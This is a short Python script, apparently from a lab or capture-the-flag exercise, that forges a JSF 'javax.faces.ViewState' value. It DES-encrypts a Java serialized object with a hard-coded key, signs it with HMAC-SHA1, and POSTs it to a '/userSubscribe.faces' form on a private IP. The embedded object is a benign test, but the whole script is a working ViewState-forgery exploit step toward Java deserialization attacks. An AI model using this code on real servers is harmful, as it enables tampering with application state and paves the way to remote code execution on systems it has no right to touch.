import requests
from base64 import b64encode
from Crypto.Cipher import DES
from Crypto.Hash import SHA, HMAC
from urllib.parse import quote_plus as urlencode

bin_vs = b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02' 
vs = '=wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='

d = DES.new(b'JsF9876-', DES.MODE_ECB)
enc_payload = d.encrypt(bin_vs)
sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()
gen_vs = b64encode(enc_payload + sig)
if urlencode(gen_vs) == vs:
    print("It worked!")
print(urlencode(gen_vs))
print(vs)

sess = requests.session()
sess.get("http://10.10.10.130:8080/userSubscribe.faces")
resp = sess.post("http://10.10.10.130:8080/userSubscribe.faces",
        data = {
            "j_id_jsp_1623871077_1%3Aemail": "mad",
            "j_id_jsp_1623871077_1%3Asubmit": "SIGN+UP",
            "j_id_jsp_1623871077_1_SUBMIT": "1",
            "javax.faces.ViewState": gen_vs})
if "<p>Subscribe to us</p>" in resp.text:
    print("Successfully retrieved page")
